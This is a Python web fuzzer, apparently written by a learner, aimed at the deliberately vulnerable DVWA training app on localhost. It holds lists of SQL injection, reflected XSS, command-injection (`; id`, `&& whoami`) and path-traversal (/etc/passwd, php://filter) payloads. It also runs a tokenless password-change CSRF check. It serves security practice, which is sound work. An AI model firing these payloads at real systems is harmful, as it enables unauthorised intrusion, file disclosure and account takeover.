#!/usr/bin/env python3
"""
Simple web app fuzzer I wrote to automate some of the manual testing I was doing.
Tests DVWA for SQLi, XSS, command injection, LFI, and CSRF.

Usage:
    1. Start DVWA in Docker: docker run -d -p 80:80 vulnerables/web-dvwa
    2. Log in at http://localhost, go to Setup, click Create Database
    3. Grab your PHPSESSID from browser dev tools and paste it below
    4. Run: python3 fuzzer.py
"""

import requests
import time
import re
from datetime import datetime

TARGET = "http://localhost"
SESSION_COOKIE = {"PHPSESSID": "YOUR_SESSION_ID_HERE", "security": "low"}  # paste your session here
OUTPUT_FILE = "fuzzer_results.txt"

# TODO: add more payloads here, currently only covering the basics
SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT null,null-- -",
    "' UNION SELECT null,database()-- -",
    "1 AND SLEEP(3)-- -",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert('XSS')>",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "127.0.0.1; id",
    "127.0.0.1 && whoami",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

SQLI_ERRORS = [
    "You have an error in your SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "SQL syntax",
]

def log(msg, f):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)
    f.write(line + "\n")

def test_sqli(url, param, f):
    log(f"\n[SQLi] {url} | param={param}", f)
    found = []
    for payload in SQLI_PAYLOADS:
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            elapsed = time.time() - start
            for err in SQLI_ERRORS:
                if err.lower() in r.text.lower():
                    log(f"  [VULN] Error-based SQLi -- payload: {payload}", f)
                    found.append(payload)
                    break
            if "SLEEP" in payload.upper() and elapsed > 2.5:
                log(f"  [VULN] Time-based blind SQLi -- took {elapsed:.1f}s", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)  # TODO: add error handling later
    if not found:
        log("  [OK] No SQLi found", f)
    return found

def test_xss(url, param, f):
    log(f"\n[XSS]  {url} | param={param}", f)
    found = []
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            if payload in r.text:
                log(f"  [VULN] Reflected XSS -- payload reflected: {payload}", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No reflected XSS found", f)
    return found

def test_cmdi(url, param, f):
    log(f"\n[CMDI] {url} | param={param}", f)
    found = []
    for payload in CMDI_PAYLOADS:
        try:
            r = requests.post(url, data={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            for indicator in ["uid=", "root:", "www-data"]:
                if indicator in r.text:
                    log(f"  [VULN] Command injection -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No command injection found", f)
    return found

def test_lfi(url, param, f):
    log(f"\n[LFI]  {url} | param={param}", f)
    found = []
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            for indicator in ["root:x:", "daemon:", "/bin/bash"]:
                if indicator in r.text:
                    log(f"  [VULN] LFI -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No LFI found", f)
    return found

def test_csrf(url, form_fields, f):
    """
    Check if a form has a CSRF token. If not, try submitting without one.
    Not 100% sure this is the right way to test it but it seemed to work.
    """
    log(f"\n[CSRF] {url}", f)
    found = []
    try:
        r = requests.get(url, cookies=SESSION_COOKIE, timeout=8)
        token_patterns = [
            r'name=["\'\']user_token["\'\'] value=["\'\']([a-f0-9]+)["\'\']',
            r'name=["\'\']csrf_token["\'\'] value=["\'\']([^\"\'']+)["\'\']',
        ]
        token_found = False
        for pattern in token_patterns:
            if re.search(pattern, r.text, re.IGNORECASE):
                token_found = True
                log(f"  [INFO] CSRF token present", f)
                break

        if not token_found:
            log("  [WARN] No CSRF token found -- testing if submission accepted without one", f)
            headers = {"Referer": ""}
            r2 = requests.get(url, params=form_fields, cookies=SESSION_COOKIE,
                              headers=headers, timeout=8)
            if r2.status_code == 200 and "login" not in r2.url.lower():
                log(f"  [VULN] CSRF likely -- form submitted without token and server returned 200", f)
                found.append(url)
            else:
                log(f"  [OK] Server rejected tokenless submission (status={r2.status_code})", f)
        else:
            log("  [OK] CSRF token present", f)
    except Exception as e:
        log(f"  [ERR] {e}", f)
    return found

def main():
    all_findings = []
    with open(OUTPUT_FILE, "w") as f:
        log(f"Fuzzer started -- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", f)

        all_findings += [("SQLi", p) for p in test_sqli(f"{TARGET}/dvwa/vulnerabilities/sqli/", "id", f)]
        all_findings += [("XSS", p) for p in test_xss(f"{TARGET}/dvwa/vulnerabilities/xss_r/", "name", f)]
        all_findings += [("CMDI", p) for p in test_cmdi(f"{TARGET}/dvwa/vulnerabilities/exec/", "ip", f)]
        all_findings += [("LFI", p) for p in test_lfi(f"{TARGET}/dvwa/vulnerabilities/fi/", "page", f)]

        csrf_fields = {"password_new": "csrf_test", "password_conf": "csrf_test", "Change": "Change"}
        all_findings += [("CSRF", u) for u in test_csrf(f"{TARGET}/dvwa/vulnerabilities/csrf/", csrf_fields, f)]

        log(f"\nDone. {len(all_findings)} finding(s).", f)
        for t, p in all_findings:
            log(f"  [{t}] {p}", f)

if __name__ == "__main__":
    main()
